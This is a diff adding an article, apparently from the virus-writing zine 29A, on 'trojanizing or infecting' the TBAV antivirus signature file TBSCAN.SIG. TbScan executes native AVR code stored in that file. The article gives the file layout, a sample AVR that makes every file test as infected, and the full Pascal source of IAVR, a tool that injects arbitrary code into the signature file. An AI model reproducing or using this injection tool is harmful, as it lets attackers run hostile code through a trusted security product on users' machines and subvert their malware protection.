@@ -1,0 +1,157 @@
+ TBSCAN.SIG infection
+ 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�>
+                                                                     Malware
+
+ TBAV uses so called AVRs  in order to  add detection  routines for catching
+ polymorphic viruses  that avoid  its generic decryption engine. Such an AVR
+ is just  native code  which  is loaded  and... executed! by  TbScan, and is
+ stored along with the virus signatures in the signature file TBSCAN.SIG.
+
+ This signature  file begins with  a 128-byte-long  header, in which  we can
+ find the  amount of 16-byte-long blocks (paragraphs)  needed by the AVRs at
+ offset 70h, stored as a word (2 bytes). At offset 72h is stored the overall
+ size of the virus signatures, as  a doubleword. That's all  we need to know
+ about the TBSCAN.SIG header in order to trojanize or infect it.
+
+ The AVRs are located just after the above contents in the file, and this is
+ the place where our virus or trojan has to be inserted. Since i do not know
+ all the specifications  of it, we can just take  what is  already there and
+ modify it so  there will be enough space for the new AVR code. Each AVR has
+ a 16-byte-long header. The word  at offset 0ch of this AVR header holds the
+ size of  the AVR code, including its  header size. Just  after this header,
+ the AVR code (wich  we'll  describe later) follows. And after  this code we
+ can find  the virus name in ASCIIZ format. The  virus name  size (including
+ the ending 0) is stored in a byte at  offset 0ah of the AVR header. The to-
+ tal size (header+code+name) is  stored as  well in a  word at offset 0eh in
+ the header. Finally, the AVR code and the virus name are encrypted by a by-
+ tewise xor with 44h.
+
+ IAVR, the program included below, does all this stuff so you can insert any
+ code you want  as an AVR in  your TBSCAN.SIG file. You just have to call it
+ 'IAVR filename_of_AVR_code'. If you  don't specify any filename, IAVR  will
+ keep on waiting  for  you to type in the AVR  code. Then, after it has read
+ the code, IAVR will prompt for the virus name your AVR has to be associated
+ with. The new signature file will then be  written to a new file whose name
+ will be TBS.SIG.
+
+ And now, before including  my program IAVR, let's have a look at the format
+ of any AVR code. It's a quite simply relocateable code. If it returns a ca-
+ rry flag, it's telling TbScan that the virus was found. The AVR code has to
+ be ended with a retf instruction. The rest is  just normal code, so you can
+ program as  usual and insert anything you want there. This is an example of
+ an AVR which triggers all the files as infected:
+
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
+ model tiny
+ .code
+ org 100h
+
+ start: stc
+        retf
+ end start
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
+
+ And finally, the Pascal source of my IAVR program, which is able to add any
+ AVR to TBSCAN.SIG, writing  the resulting file as TBS.SIG. You can find the
+ compiled executable version of this program in the \FILES directory of this
+ issue of 29A.
+
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
+ uses Crt;
+
+ const Name : String = 'Default_Virus';
+
+ type PWord = ^Word;
+
+ var F1,F2,F3 : File;
+     ML,L,i,BP1 : word;
+     OP,Size_ : LongInt;
+     Buffer : Array[0..$2000] of Byte;
+
+ begin
+   Size_:=0;
+   assign(F1,'tbscan.sig'); Reset(f1,1);   { open original signature file   }
+   assign(F2,'tbs.sig'); rewrite(f2,1);    { create new signature file      }
+   assign(F3,ParamStr(1)); reset(F3,1);    { open file with code to insert  }
+   blockread(F1,Buffer,$80);               { read header of signature file  }
+   blockwrite(F2,Buffer,$80);              { and simply write it to new one }
+   blockread(f1,buffer,$1fff);             { read first 1FFF byte of orig.  }
+   blockread(f3,buffer[$10],$2000,L);      { read upto 2000 byte of code    }
+   L:=L+$10;                               { add size of header for AVR     }
+   Buffer[$0c]:=L and $FF;                 { write header size into buffer  }
+   Buffer[$0d]:=L div $100;
+   Write('Name :'); Readln(Name);          { ask for a name for the virus   }
+                                           { thats detected by the new AVR  }
+   For i:=1 to Ord(Name[0]) do Buffer[L+I-1]:=Ord(Name[i]);
+                                           { write it into buffer           }
+   Buffer[L+Ord(Name[0])]:=0;              { and end it with a zero         }
+   L:=L+Ord(Name[0])+1;                    { add length of name to size     }
+   Buffer[$0a]:=Ord(name[0])+1;            { store length of name           }
+   Buffer[$0e]:=L and $FF;                 { and full length of AVR         }
+   Buffer[$0f]:=L div $100;
+   for i:=$10 to L do Buffer[I]:=Buffer[I] XOR $44;
+                                           { encrypt the new AVR            }
+   blockwrite(f2,buffer,L);                { and write it to new sig.-file  }
+   ML:=L;
+   seek(f1,$80);                           { seek back to top of original  }
+                                           { AVRS }
+
+   { now write the rest of the original signature file to the new one }
+   L:=$2000;
+   While L=$2000 do Begin
+     BlockRead(F1,Buffer,L,L);
+     BlockWrite(F2,Buffer,L);
+   End;
+
+   Seek(F2,$80);                           { begin right after header again }
+   Repeat
+     OP:=FilePos(f2);                      { save position we have in file  }
+     blockread(f2,buffer,$1fff);           { read a bit from file           }
+     if Buffer[1]=$FF then begin           { is it an cotrol entry ?        }
+                                           { yes, is control entry          }
+       for i:=$10 to Buffer[$0e]+word(buffer[$0f])*256 do Buffer[I]:=Buffer[I] XOR $44;
+                                           { decrypt it                     }
+       i:=Buffer[$0c]+word(buffer[$0d])*256;
+                                           { ???                            }
+       OP:=OP+Buffer[$0e]+word(buffer[$0f])*256;
+                                           { add size of entry to position  }
+                                           { in file                        }
+       Size_ := Size_ + Buffer[$0e]+word(buffer[$0f])*256;
+                                           { summarize all sizes            }
+       Seek(F2,OP);                        { seek to position after entry   }
+     end;
+   Until Eof(F2) or ( Buffer[1]<>$FF );
+
+   If Not( Eof(F2) ) then Begin            { now the signatures             }
+     BP1 := 0;
+     while (Buffer[BP1]<>0) do begin       { repeat until end of this       }
+                                           { signature-block                }
+       Size_ := Size_ + Buffer[BP1+8] + Buffer [BP1+7] + 10;
+                                           { add size of entry              }
+       BP1:=Buffer[BP1+8]+$A+BP1+Buffer[BP1+7];
+                                           { here too                       }
+       if BP1>=$1E00 then begin            { we need a new part of file to  }
+                                           { read sometimes                 }
+         Seek(F2,OP+LongInt(BP1));
+         OP:=OP+LongInt(Bp1);
+         BlockRead(F2,Buffer,$2000);
+         BP1:=0;
+       end;
+     end;
+     Size_ := Size_ + $81;                 { somehow 129 byte was missed   }
+     Seek(F2,$70);
+     BlockRead(F2,Buffer,6);               { read 6 byte from offset $70   }
+     Seek(F2,$70);
+     PWord(@Buffer[0])^:=PWord(@Buffer[0])^ + ( (ML+15) DIV 16) ;
+                                           { add para size of new AVR code }
+     Buffer[2]:=Size_ and $FF;             { writew new size of signatures }
+     Buffer[3]:=( Size_ SHR 8 ) and $FF;
+     Buffer[4]:=( Size_ SHR 16 ) and $FF;
+     Buffer[5]:=( Size_ SHR 24 ) and $FF;
+     BlockWrite(F2,Buffer,6);              { write the 6 byte back to file }
+   End;
+   Close(F1); Close(F2); Close(F3);
+ end.
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
+
+ Malware
